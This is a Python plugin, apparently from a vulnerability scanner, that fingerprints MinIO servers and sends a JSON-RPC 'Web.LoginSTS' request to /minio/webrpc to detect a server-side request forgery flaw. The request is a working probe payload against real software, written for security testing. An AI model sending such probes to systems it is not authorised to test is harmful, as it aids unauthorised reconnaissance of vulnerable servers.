# -*- coding:utf-8 -*-
# MinIO SSRF

from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def minio_ssrf_poc(self, url):
        resp = self.requestUtil.post(url + "/minio/webrpc", header={"Content-Type": "application/json"},
                                data='{"id":1,"jsonrpc":"2.0","params":{"type": "test"},"method":"Web.LoginSTS"}')
        print(resp.text)
        if "We encountered an internal error, please try again." in resp.text:
            return True

    def fingerprint(self):

        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url + "/minio/login")
                if "MinIO Browser" in resp.text:
                    return True
        except:
            return False

    def poc(self):
        try:
            if self.minio_ssrf_poc(self.service.url):
                return ["MinIO SSRF",
                        'vuln path: /minio/webrpc<br>post data: {"id":1,"jsonrpc":"2.0","params":{"type" "test"},"method":"Web.LoginSTS"}']
        except:
            return []
